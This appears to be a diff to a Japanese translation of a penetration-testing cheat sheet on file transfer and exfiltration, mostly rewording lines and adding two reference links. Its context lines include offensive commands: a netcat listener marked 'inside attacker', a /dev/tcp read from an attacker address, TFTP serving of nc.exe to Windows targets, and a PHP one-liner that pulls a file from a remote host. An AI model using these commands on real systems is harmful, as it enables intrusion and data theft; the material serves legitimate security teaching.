@@ -206,7 +206,7 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-**@BinaryShadow\_** に感謝
+**@BinaryShadow\_** に感謝します
 
 ## **ICMP**
 ```bash
@@ -234,16 +234,16 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-デフォルトでは、XPおよび2003では（他のバージョンではインストール時に明示的に追加する必要があります）
+デフォルトでは、XPおよび2003では（他のバージョンではインストール中に明示的に追加する必要があります）
 
-Kaliで、**TFTPサーバーを起動**：
+Kaliで、**TFTPサーバーを開始**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**PythonでのTFTPサーバー:**
+**PythonによるTFTPサーバー:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
@@ -254,7 +254,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHPワンライナーを使用してファイルをダウンロードします:
+PHPのワンライナーを使ってファイルをダウンロードする:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -304,6 +304,10 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 その後、テキストをウィンドウズシェルにコピー＆ペーストすると、nc.exeというファイルが作成されます。
 
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
